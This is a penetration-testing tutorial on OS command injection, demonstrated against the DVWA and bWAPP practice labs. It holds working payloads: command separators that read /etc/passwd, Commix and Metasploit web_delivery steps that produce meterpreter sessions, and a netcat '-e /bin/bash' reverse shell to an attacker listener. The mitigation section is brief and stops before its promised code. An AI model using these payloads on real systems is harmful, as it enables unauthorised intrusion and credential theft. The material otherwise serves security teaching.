<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/website-hacking/" rel="category tag">Website Hacking</a></span>            </div>
            <h1 class="post-title entry-title">Comprehensive Guide on OS Command Injection</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/comprehensive-guide-on-os-command-injection/" rel="bookmark"><time class="entry-date published" datetime="2020-07-08T19:02:51+00:00">July 8, 2020</time><time class="updated" datetime="2025-05-31T22:37:19+00:00">May 31, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">Isn’t it great if you get the privilege to run any system commands directly on the target’s server through its hosted web-application? Or you can get the reverse shell with some simple clicks? In this article, we’ll learn about OS Command Injection, in which an attacker is able to trigger some arbitrary system shell commands on the hosted operating system via a vulnerable web-application.</span></p>
<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li class="ai-optimize-8"><span style="color: #000000;">Introduction to Command Injection</span></li>
<li class="ai-optimize-9"><span style="color: #000000;">How Command Injection Occurs?</span></li>
<li class="ai-optimize-10"><span style="color: #000000;">Metacharacters</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">Types of Command Injection</span></li>
<li class="ai-optimize-12"><span style="color: #000000;">Impact of OS Command Injection</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">Steps to exploit – OS Command Injection</span></li>
<li class="ai-optimize-14"><span style="color: #000000;">Manual Exploitation</span>
<ul>
<li class="ai-optimize-15"><span style="color: #000000;">Basic OS Command injection</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">Bypass a Blacklist implemented</span></li>
</ul>
</li>
<li class="ai-optimize-17"><span style="color: #000000;">Exploitation through Automated tools</span>
<ul>
<li class="ai-optimize-18"><span style="color: #000000;">Burp Suite</span>
<ul>
<li class="ai-optimize-19"><span style="color: #000000;">Manual</span></li>
<li class="ai-optimize-20"><span style="color: #000000;">Fuzzing</span></li>
</ul>
</li>
<li class="ai-optimize-21"><span style="color: #000000;">Commix</span></li>
<li class="ai-optimize-22"><span style="color: #000000;">Metasploit</span></li>
</ul>
</li>
<li class="ai-optimize-23"><span style="color: #000000;">Blind OS Command Injection</span>
<ul>
<li class="ai-optimize-24"><span style="color: #000000;">Detection</span></li>
<li class="ai-optimize-25"><span style="color: #000000;">Exploitation</span></li>
</ul>
</li>
<li class="ai-optimize-26"><span style="color: #000000;">Mitigation – OS Command Injection</span></li>
</ul>
<h3 class="ai-optimize-27"><span style="color: #800000;">Introduction</span></h3>
<p class="ai-optimize-28"><span style="color: #000000;">Command Injection also referred to as Shell Injection or OS Injection. It arises when an attacker tries to perform system-level commands directly through a vulnerable application in order to retrieve information of the webserver or try to make unauthorized access into the server. Such an attack is possible only when the user-supplied data is not properly validated before passing to the server. This user data could be in any form such as forms, cookies, HTTP headers, etc.</span></p>
<h3 class="ai-optimize-29"><span style="color: #800000;">How Command Injection Occurs?</span></h3>
<p class="ai-optimize-30"><span style="color: #000000;">There are many situations when the developers try to include some functionalities into their web application by making the use of the operating system commands. However, if the application passes the user-supplied input directly to the server without any validation, thus the application might become vulnerable to command injection attacks.</span></p>
<p class="ai-optimize-31"><span style="color: #000000;">In order to clear the vision, let’s consider this scenario:</span></p>
<p class="ai-optimize-32"><span style="color: #000000;">Think for a web-application providing functionality that any user can ping any particular IP address through his web-interface in order to confirm the host connection, which means that the application is passing the <strong>ping</strong> command with that particular input IP directly to the server.</span></p>
<p class="ai-optimize-33"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BZoU9Id88IY/XwYS8aQ-QdI/AAAAAAAAlgg/Mcx0uqIfxA8xgbucIBxkdqzce9QU1e0OQCLcBGAsYHQ/s1600/0.png"/></span></p>
<p class="ai-optimize-34"><span style="color: #000000;">Now if an attacker injects an unwanted system command adding up with the basic ping command using some metacharacters. Thus the web-application pass it all to the server directly for execution, allowing the attacker to gain the complete access of the operating system, start or stop a particular service, view or delete any system file and even captures a remote shell.</span></p>
<p class="ai-optimize-35"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ceLOuQeHNY4/XwYS_2nRRcI/AAAAAAAAlgk/aRoqPpOfhXEeAxlqw3HMD6tW0QXzKOTvACLcBGAsYHQ/s1600/1.png"/></span></p>
<h3 class="ai-optimize-36"><span style="color: #800000;">Metacharacters</span></h3>
<p class="ai-optimize-37"><span style="color: #000000;">Metacharacters are the symbolic operators which are used to separate the actual commands from the unwanted system commands. The semicolon (;) and the ampercent (&amp;) are majorly used as separators that divides the authentic input command and the command that we are trying to inject.</span></p>
<p class="ai-optimize-38"><span style="color: #000000;">The commonly used metacharacters are:</span></p>
<p class="ai-optimize-39"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6gBJiPJcgaY/XwYTEfNCIDI/AAAAAAAAlgo/t0I-RaBQQIsKemMGby1bTtDa9dOkQ_elgCLcBGAsYHQ/s1600/2.1.png"/></span></p>
<h3 class="ai-optimize-40"><span style="color: #800000;">Types of Command Injection</span></h3>
<p class="ai-optimize-41"><span style="color: #000000;"><strong>Error based injection: </strong>When an attacker injects a command through an input parameter and the output of that command is displayed on the certain web page, it proves that the application is vulnerable to the command injection. The displayed result might be in the form of an error or the actual outcomes of the command that you tried to run. An attacker then modifies and adds additional commands depending on the shell the webserver and assembles information from the application.</span></p>
<p class="ai-optimize-42"><span style="color: #000000;"><strong>Blind based Injection:</strong> The results of the commands that you inject will not be displayed to the attacker and no error messages are returned. The attacker might use another technique to identify whether the command was really executed on the server or not.</span></p>
<p class="ai-optimize-43"><span style="color: #000000;">The OS Command Injection vulnerability is one of the top <strong>10 OWASP</strong> vulnerabilities. Therefore let’s have a look onto its impact.</span></p>
<h3 class="ai-optimize-44"><span style="color: #800000;">Impact of OS Command Injection</span></h3>
<p class="ai-optimize-45"><span style="color: #000000;">OS command injection is one of the most powerful vulnerability with <strong>“High Severity having a CVSS Score of 8”</strong>.</span></p>
<p class="ai-optimize-46"><span style="color: #000000;">Thus this injection is reported under:</span></p>
<ol>
<li class="ai-optimize-47"><span style="color: #000000;"><strong>CWE-77</strong>: Improper Neutralization of Special Elements used in a Command.</span></li>
<li class="ai-optimize-48"><span style="color: #000000;"><strong>CWE-78</strong>: Improper Neutralization of Special Elements used in an OS Command.</span></li>
</ol>
<p class="ai-optimize-49"><span style="color: #000000;">Wonder how to exploit this vulnerability? Let’s check out its steps:</span></p>
<h3 class="ai-optimize-50"><span style="color: #800000;">Steps to exploit – OS Command Injection</span></h3>
<p class="ai-optimize-51"><span style="color: #000000;">1: Identify the input field</span></p>
<p class="ai-optimize-52"><span style="color: #000000;">2: Understand the functionality</span></p>
<p class="ai-optimize-53"><span style="color: #000000;">3: Try the Ping method time delay</span></p>
<p class="ai-optimize-54"><span style="color: #000000;">4: Use various operators to exploit OS Command Injection</span></p>
<p class="ai-optimize-55"><span style="color: #000000;">So I guess until now you might be having a clear vision with the concept of <strong>OS command injection</strong> and its methodology. But before making our hands wet with the attacks let’s clear one more thing i.e.</span></p>
<p class="ai-optimize-56"><span style="color: #000000;"><strong>“</strong><strong>Command Injection differs from Code Injection”</strong>, in that code injection allows the attacker to add their own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code. Source:</span></p>
<p class="ai-optimize-57"><span style="color: #0000ff;"><strong><u><a style="color: #0000ff;" href="https://owasp.org/www-community/attacks/Command_Injection">https://www.owasp.org/index.php/Command_Injection</a></u></strong></span></p>
<p class="ai-optimize-58"><span style="color: #000000;"><strong>Let’s Start!!</strong></span></p>
<h3 class="ai-optimize-59"><span style="color: #800000;">Basic OS Command injection</span></h3>
<p class="ai-optimize-60"><span style="color: #000000;">I’ve opened the target IP in my browser and logged in into DVWA as <strong>admin : password, </strong>from the DVWA security option I’ve set the <strong>security level</strong> to <strong>low.</strong> Now I’ve opted for the Command Injection vulnerability present on the left-hand side of the window.</span></p>
<p class="ai-optimize-61"><span style="color: #000000;">I’ve been presented with a form which is suffering from OS command injection vulnerability asking to <strong>“Enter an IP address:”.</strong></span></p>
<p class="ai-optimize-62"><span style="color: #000000;">From the below image you can see that, I’ve tried to ping its localhost by typing <strong>127.0.0.1, </strong>and therefore I got the output result.</span></p>
<p class="ai-optimize-63"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xWHPvgcBVKE/XwYTIrt85AI/AAAAAAAAlgs/KvhdI22qv4o3Ot0GMkc0uEw4yJtMj7UDwCLcBGAsYHQ/s1600/2.png"/></span></p>
<p class="ai-optimize-64"><span style="color: #000000;">In order to perform the “Basic OS Command Injection attack”, I’ve used the <strong>“; (</strong>semicolon<strong>)” </strong> as a metacharacter and entered another arbitary command i.e. <strong>“ls”</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">127.0.0.1;ls</pre>
<p class="ai-optimize-65"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FF1XFkgZiWY/XwYTMFNEeJI/AAAAAAAAlg0/WdEeBfCZce4-4dDNIRWUQpvHxkWtOE3NwCLcBGAsYHQ/s1600/3.png"/></span></p>
<p class="ai-optimize-66"><span style="color: #000000;">From the below image you can see that the <strong>“;”</strong> metacharacter did its work, and we are able to list the contents of the directory where the application actually is. Similarly we can run the other system commands such as <strong>“;pwd”, “;id” </strong>etc.</span></p>
<p class="ai-optimize-67"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ith6eT5AOvA/XwYTPK51B1I/AAAAAAAAlg4/P_g1ZkXb5ksoPGbcqJdfgS8_D2fv6gkKwCLcBGAsYHQ/s1600/4.png"/></span></p>
<h3 class="ai-optimize-68"><span style="color: #800000;">Bypass a Blacklist implemented</span></h3>
<p class="ai-optimize-69"><span style="color: #000000;">Many times the developers set up a blacklist of the commonly used metacharacters i.e. of  <strong>“&amp;”</strong>,<strong> “;”</strong>,<strong> ”&amp;&amp;”</strong>,<strong> “||”</strong>, <strong>“#”</strong> and the other ones to protect their web-applications from the command injection vulnerabilities.</span></p>
<p class="ai-optimize-70"><span style="color: #000000;">Therefore in order to bypass this blacklist, we need to try all the different metacharacters that the developer forgot to add.</span></p>
<p class="ai-optimize-71"><span style="color: #000000;">I’ve increased up the security level too <strong>high </strong>and tried up with all the different combinations of metacharacters.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-zh-2Fe63Etw/XwYTTqLGBZI/AAAAAAAAlhA/uIDnCKulAsEIu9PmD0I1EPpNYQmcXfi-gCLcBGAsYHQ/s1600/5.png"/></p>
<p class="ai-optimize-72"><span style="color: #000000;">From the above image, you can see that I’ve successfully captured the password file by using the metacharacter <strong>“|”</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">127.0.0.1 |cat /etc/passwd</pre>
<h3 class="ai-optimize-73"><span style="color: #800000;">Command Injection using BurpSuite</span></h3>
<p class="ai-optimize-74"><span style="color: #000000;">Burpsuite is considered as one of the best and the most powerful tool for web-penetration testing. So we’ll try to deface the web-application through it.</span></p>
<p class="ai-optimize-75"><span style="color: #000000;">I’ve now logged in into bWAPP with <strong>bee : bug </strong>by running up the target’s IP into the browser, and have even <strong>set the security leve</strong>l to <strong>medium </strong>and “<strong>Choose</strong> <strong>your bug</strong>” option to “<strong>OS Command Injection”.</strong></span></p>
<p class="ai-optimize-76"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MnJSTdPmn-4/XwYTXuD5RJI/AAAAAAAAlhI/pZ0UoJ1vGoQsL7Go0gIj7PWt-HCPfCr8gCLcBGAsYHQ/s1600/6.png"/></span></p>
<p class="ai-optimize-77"><span style="color: #000000;">Let’s try to enumerate this “<strong>DNS lookup”</strong> <strong>form</strong> by clicking on the <strong>Lookup </strong>button and simply capturing the <strong>browser’s request </strong>in the <strong>proxy </strong>tab and sending the same to the <strong>Repeater.</strong></span></p>
<p class="ai-optimize-78"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cM2sv39KA0U/XwYTbtQIgwI/AAAAAAAAlhM/fmqzOu8vRpcmoMat8OgRVKdoub_bQKoXACLcBGAsYHQ/s1600/7.0.png"/></span></p>
<p class="ai-optimize-79"><span style="color: #000000;">Now I just need to manipulate the target by adding up some system commands i.e. <strong>“pwd</strong>” with the help of metacharacters.</span></p>
<p class="ai-optimize-80"><span style="color: #000000;">In this I’ve used <strong>“|” </strong>as the delimiter, you can choose yours.</span></p>
<p class="ai-optimize-81"><span style="color: #000000;">As soon as I click on the <strong>Go </strong>tab, the response starts generating and on the right-hand side of the window you can see that I’ve captured the <strong>working directory.</strong></span></p>
<p class="ai-optimize-82"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-E6RcWnfOUSc/XwYTe-br-NI/AAAAAAAAlhQ/LcCmE4YULF8nVkjUnPx5qzkbwjMNWsIWQCLcBGAsYHQ/s1600/8.0.png"/></span></p>
<h3 class="ai-optimize-83"><span style="color: #800000;">Fuzzing</span></h3>
<p class="ai-optimize-84"><span style="color: #000000;">In the last scenario, while bypassing the implemented blacklist, we were lucky that the developer had created and set up the list with the limited combination of metacharacters. But still, it took time, to check for every possible combination of the metacharacters. And therefore it is obvious that this metacharacter would not work with every web-application, thus in order to bypass these differently generated blacklists, we’ll be doing a fuzzing attack.</span></p>
<p class="ai-optimize-85"><span style="color: #000000;"><strong>Let’s check it out how!!</strong></span></p>
<p class="ai-optimize-86"><span style="color: #000000;">I’ve created a dictionary with all the possible combinations of the metacharacters and now will simply include it into my attack.</span></p>
<p class="ai-optimize-87"><span style="color: #000000;">Tune in you <strong>burp suite</strong> and start <strong>intercepting the request</strong>, as soon as you <strong>capture</strong> the ongoing request send the same to the <strong>intruder </strong>by simply doing a right-click on the proxy tab and choose the option to <strong>send to intruder.</strong></span></p>
<p class="ai-optimize-88"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-t7wdK9UPD5Q/XwYTiWLVwYI/AAAAAAAAlhU/pPTrBoz0fy4FcJ6uRg5ZnIYRHWD9U-CXwCLcBGAsYHQ/s1600/9.0.png"/></span></p>
<p class="ai-optimize-89"><span style="color: #000000;">Now we’ll set up the attack position by simply shifting the current tab to the <strong>Positions </strong>tab, and selecting the area where we want to make the attack happen with the <strong>ADD</strong> button.</span></p>
<p class="ai-optimize-90"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ozj8_m-BA54/XwYTmG6OsUI/AAAAAAAAlhc/5jFqSsi3DbQFYazNmNpK0YbqrzC5RW9CgCLcBGAsYHQ/s1600/10.0.png"/></span></p>
<p class="ai-optimize-91"><span style="color: #000000;">Time to inject our dictionary, now move to the <strong>Payload </strong>tab and click on the <strong>load </strong>button in order to load our dictionary file.</span></p>
<p class="ai-optimize-92"><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-wX_kkWGV2zQ/XwYTp0vj8II/AAAAAAAAlhg/udLafCSVHAskJf0ifNw7vyUjPicptkKUQCLcBGAsYHQ/s1600/11.0.png"/></strong></span></p>
<p class="ai-optimize-93"><span style="color: #000000;">As soon as I fire up the <strong>Start Attack </strong>button, a new window will pop up with the fuzzing attack.</span></p>
<p class="ai-optimize-94"><span style="color: #000000;">From the below screenshot, it’s clear that our attack has been started and there is a fluctuation in the length section. I’ve double-clicked on the length field in order to get the highest value first.</span></p>
<p class="ai-optimize-95"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yGExIiJ7Fm0/XwYTs2cbFQI/AAAAAAAAlhk/8tyvChr-zIcELUqfAB0YZRy9YIo_GSlAACLcBGAsYHQ/s1600/12.0.png"/></span></p>
<p class="ai-optimize-96"><span style="color: #000000;">From the below image, you can see that as soon as I clicked over the <strong>11<sup>th</sup> Request,</strong> I was able to detect the<strong> ls</strong> command running in the <strong>response tab.</strong></span></p>
<p class="ai-optimize-97"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LpBoo3KvWWs/XwYTwVI-JyI/AAAAAAAAlhs/ejlo7O1EwpId5O5fD_LxTJ8IA3kt2M6zQCLcBGAsYHQ/s1600/13.0.png"/></span></p>
<h3 class="ai-optimize-98"><span style="color: #800000;">OS Command Injection using Commix</span></h3>
<p class="ai-optimize-99"><span style="color: #000000;">Sometimes fuzzing consumes a lot of time, and even it becomes somewhat frustrating while performing a command injection attack over it i.e. wait for the incremented length and check for every possible response it drops.</span></p>
<p class="ai-optimize-100"><span style="color: #000000;">In order to make our attack simpler and faster, we’ll be using a python scripted automated tool <strong>“Commix”, </strong>which makes it very easy to find the command injection vulnerability and then helps us to exploit it. You can learn more about <strong>Commix </strong>from <a style="color: #000000;" href="https://www.hackingarticles.in/commix-command-injection-exploiter-beginners-guide/"><span style="color: #0000ff;"><strong>here</strong></span>.</a></span></p>
<p class="ai-optimize-101"><span style="color: #000000;">So let’s try to drop down the web-application again by getting a commix session in our kali machine.</span></p>
<p class="ai-optimize-102"><span style="color: #000000;">From the below image you can see that I’ve set the security level too <strong>high </strong>and opted the <strong>“Choose your bug”</strong> option to <strong>“OS Command Injection”.</strong></span></p>
<p class="ai-optimize-103"><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-Wg5f1fIG0m4/XwYT02yHvMI/AAAAAAAAlh0/vrV_gt001GwMCeCFw8sarVy_6-YFfo3XACLcBGAsYHQ/s1600/14.png"/></strong></span></p>
<p class="ai-optimize-104"><span style="color: #000000;">Commix works on <strong>cookies. </strong>Thus in order to get them, I’ll be capturing the <strong>browser’s request</strong> into my burpsuite, by simply enabling the proxy and the intercept options, further as I hit up the <strong>Lookup </strong>button, I’ll be presented with the details into the burpsuite’s <strong>Proxy</strong> tab.</span></p>
<p class="ai-optimize-105"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nVa7UOjvkkA/XwYT4TVRKpI/AAAAAAAAlh4/yBwcPYPsInwzCrTga4c29GjYaNmLaHxtQCLcBGAsYHQ/s1600/15.png"/></span></p>
<p class="ai-optimize-106"><span style="color: #000000;">Fire up you Kali Terminal with <strong>commix </strong>and run the following command with the <strong>Referer, Cookie, and target values</strong>:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">commix --url="http://192.168.0.11/bWAPP/commandi.php" --cookie="security_level=2; PHPSESSID=cc91040cc70b9abdb2fdc637527bf132" --data="target=www.nsa.gov&amp;form=submit"</pre>
<p class="ai-optimize-107"><span style="color: #000000;">Type ‘y’ to resume the classic injection point and to the pseudo-terminal shell.</span></p>
<p class="ai-optimize-108"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-X9A0gssljF8/XwYT_RtSDOI/AAAAAAAAliE/aeYtM-0cJMsp1-d_1kjkHs98nVzfDi6LwCLcBGAsYHQ/s1600/16.png"/></span></p>
<p class="ai-optimize-109"><span style="color: #000000;">Great!! We’re into our target’s machine.</span></p>
<h5 class="ai-optimize-110"><strong><span style="color: #000000;">What if we could convert this commix shell into a meterpreter one?</span></strong></h5>
<p class="ai-optimize-111"><span style="color: #000000;">As soon as we capture the commix session, we’ll try to generate a reverse meterpreter session of the target machine by executing the following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">reverse_tcp
set lhost 192.168.0.9
set lport 4444</pre>
<p class="ai-optimize-112"><span style="color: #000000;">As we hit enter, it will ask us to choose whether we want a <strong>netcat </strong>shell or some other <strong>(meterpreter) </strong>one. Choose option <strong>2</strong> and hit <strong>enter</strong> again.</span></p>
<p class="ai-optimize-113"><span style="color: #000000;">Now you’ll be popped up with a new list of sessions asking for which meterpreter session you want as in whether you want it to be PHP, Windows, python etc. As our target server is running over the PHP framework, we will select option <strong>8</strong> i.e. a<strong> PHP meterpreter reverse shell.</strong></span></p>
<p class="ai-optimize-114"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vDWIcX8y_w4/XwYUDSeqAxI/AAAAAAAAliI/JIQcTZ8exswgVC7jY5fEo4EhhdHPU0LgwCLcBGAsYHQ/s1600/17.png"/></span></p>
<p class="ai-optimize-115"><span style="color: #000000;">When everything is done, it will provide us with a resource file with an execution command. Open a new terminal window and type the presented command there, as in our case it generated the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -r /usr/share/commix/php_meterpreter.rc</pre>
<p class="ai-optimize-116"><span style="color: #000000;">Cool!! It’s great to see that our commix session is now having some new wings.</span></p>
<p class="ai-optimize-117"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-u2GVv_UH130/XwYUGvis_cI/AAAAAAAAliM/8_ntIBpYYSMiwIJvom5JqNpnCQhMjVnfwCLcBGAsYHQ/s1600/18.png"/></span></p>
<h3 class="ai-optimize-118"><span style="color: #800000;">OS Command Injection using Metasploit</span></h3>
<p class="ai-optimize-119"><span style="color: #000000;">Why drive so long in order to get a meterpreter session, if we can just gain it directly through the Metasploit framework.</span></p>
<p class="ai-optimize-120"><span style="color: #000000;">Let’s check it out how</span></p>
<p class="ai-optimize-121"><span style="color: #000000;">Boot the <strong>Metasploit framework</strong> into your kali terminal by running up the simple command “<strong>msfconsole”.</strong></span></p>
<p class="ai-optimize-122"><span style="color: #000000;">There are many different ways that provide us with our intended outcome. But we will use the <strong>web_delivery exploit</strong> in order to find a way to transfer our malicious payload into the remote machine.</span></p>
<p class="ai-optimize-123"><span style="color: #000000;">Type the following commands to generate our payload:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/script/web_delivery</pre>
<p class="ai-optimize-124"><span style="color: #000000;">Now it’s time to choose our target.</span></p>
<p class="ai-optimize-125"><span style="color: #000000;">Type <strong>“show targets”</strong> in order to get the complete list of all the in-built target options.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set target 1
set payload php/meterpreter/reverse_tcp
set lhost 192.168.0.9
set lport 2222
exploit</pre>
<p class="ai-optimize-126"><span style="color: #000000;">As soon as I hit enter after typing <strong>exploit, </strong>the Metasploit framework will generate the payload with all the essentials.</span></p>
<p class="ai-optimize-127"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LbJAIHefKyk/XwYUJyv5gqI/AAAAAAAAliQ/egv8VQAf2nw_XvMS9gKz14WFN0k3-VhVwCLcBGAsYHQ/s1600/19.png"/></span></p>
<p class="ai-optimize-128"><span style="color: #000000;">We are almost done, just simply include this payload with the command using any metacharacter.</span></p>
<p class="ai-optimize-129"><span style="color: #000000;">Here I’ve used <strong>&amp; (</strong>ampercent<strong>) </strong>so that the server executes both the commands one after the another.</span></p>
<p class="ai-optimize-130"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Q8ylZwCh434/XwYUN9aQlwI/AAAAAAAAliY/H4x4DUHIV3MnNkuOxcjoX-IEluMN5HiTQCLcBGAsYHQ/s1600/20.png"/></span></p>
<p class="ai-optimize-131"><span style="color: #000000;">From the below image you can see that we are into the target’s system again, but this time we are more powerful with the Metasploit session.</span></p>
<p class="ai-optimize-132"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dVSAntT6MN0/XwYURPagnMI/AAAAAAAAlig/rBYliwUtKiwuFqkFL_-VAtwC9_dJMnVHQCLcBGAsYHQ/s1600/21.png"/></span></p>
<h3 class="ai-optimize-133"><span style="color: #800000;">Blind OS Command Injection</span></h3>
<p class="ai-optimize-134"><span style="color: #000000;">So until now, we were lucky enough that the web-applications were returning the outputs from the commands directly on the screen through their HTTP Responses. </span><span style="color: #000000;">But there are many situations when the applications do not return anything and still run some system commands as into their backend processes. </span><span style="color: #000000;">So the question arises – Do such web-applications are vulnerable to command injection??</span></p>
<p class="ai-optimize-135"><span style="color: #000000;">Let’s try to figure this out by using the most reliable method <strong>the time-delay ping command</strong> which will detect whether the application is suffering from command injection or not.</span></p>
<h4 class="ai-optimize-136"><span style="color: #000000;">Detection of Blind OS Command Injection</span></h4>
<p class="ai-optimize-137"><span style="color: #000000;">I’ve now logged in inside bWAPP and selected the <strong>“Choose you bug” </strong>option to <strong>“OS Command Injection – Blind”. </strong>Further setting up the security level to <strong>medium.</strong></span></p>
<p class="ai-optimize-138"><span style="color: #000000;">Thus I’ve been redirected to the web application which is suffering from command injection vulnerability.</span></p>
<p class="ai-optimize-139"><span style="color: #000000;">Let’s check, whether this application is actually suffering from the OS Command Injection or not.</span></p>
<p class="ai-optimize-140"><span style="color: #000000;">Enter any <strong>IP address </strong>in the field provided and <strong>turn on</strong> your burpsuite monitor in order to capture the ongoing <strong>http request, </strong>thus forwarding it all into the <strong>repeater tab.</strong></span></p>
<p class="ai-optimize-141"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-n3aGHyWkfT8/XwYUVWOH9zI/AAAAAAAAlio/zJ-feR03PTIT9lcuVKLvMwXlF1Lww8lmQCLcBGAsYHQ/s1600/22.png"/></span></p>
<p class="ai-optimize-142"><span style="color: #000000;">Now we’ll try to manipulate the request with</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ping –c 10 192.168.0.9</pre>
<p class="ai-optimize-143"><span style="color: #000000;">As I clicked over the <strong>Go </strong>tab, it took about <strong>10 seconds</strong> to display the response result. Thus confirms up that this web-application is suffering from OS Command Injection.</span></p>
<p class="ai-optimize-144"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OGix6bQFZ20/XwYUY2b9ICI/AAAAAAAAlis/C_yUTTE1FFQMdpguhgUGx-xl3DiW9t-cgCLcBGAsYHQ/s1600/23.png"/></span></p>
<h3 class="ai-optimize-145"><span style="color: #800000;">Exploiting Blind OS Command Injection using Netcat</span></h3>
<p class="ai-optimize-146"><span style="color: #000000;">As of now, we are confirmed that the application which we are trying to surf is suffering from command injection vulnerability. Let’s try to trigger out this web-application by generating a reverse shell using <strong>netcat.</strong></span></p>
<p class="ai-optimize-147"><span style="color: #000000;">From the below image you can see that I’ve checked my Kali machine’s <strong>IP address</strong> and set up the <strong>netcat listener</strong> at port number <strong>2000 </strong>using</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc –lvp 2000</pre>
<p class="ai-optimize-148"><span style="color: #000000;">where <strong>l = listen</strong>, <strong>v = verbose mode</strong> and <strong>p = port.</strong></span></p>
<p class="ai-optimize-149"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GvixS86VOZ4/XwYUceaobEI/AAAAAAAAliw/eohGy252Buw9trhQdD5SudX4etk05orBACLcBGAsYHQ/s1600/24.png"/></span></p>
<p class="ai-optimize-150"><span style="color: #000000;">Now on the web application, I’ve injected my <strong>netcat </strong>system command with the <strong>localhost</strong> command into the input field i.e.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">localhost|nc 192.168.0.9 –e /bin/bash</pre>
<p class="ai-optimize-151"><span style="color: #000000;">The <strong>–e /bin/bash</strong> empowers the netcat command to execute a bash shell on the listener machine.</span></p>
<p class="ai-optimize-152"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fbsdCK9XEz4/XwYUnHCDATI/AAAAAAAAljE/O0LbjcW4Yx495v-P3AnzLaaosPacCzqPgCLcBGAsYHQ/s1600/25.png"/></span></p>
<p class="ai-optimize-153"><span style="color: #000000;">Great!! We are into the victim’s shell through our kali machine and we’re now able to run any system command from here.</span></p>
<p class="ai-optimize-154"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5ylmYOC_2qM/XwYUra2NdnI/AAAAAAAAljI/pxqCmt1Vmf45TF5gRWWRcjUpprYQcdYvQCLcBGAsYHQ/s1600/26.png"/></span></p>
<h3 class="ai-optimize-155"><span style="color: #800000;">Mitigation – OS Command Injection</span></h3>
<p class="ai-optimize-156"><span style="color: #000000;">The developers should set up some strong server-side validated codes and implement a set of whitelist commands. It only accepts the alphabets and the digits rather than the characters.</span></p>
<p class="ai-optimize-157"><span style="color: #000000;">You can check this all out from the following code snippet. It can protect the web-applications from exposing to the command injection vulnerabilities.</span></p>
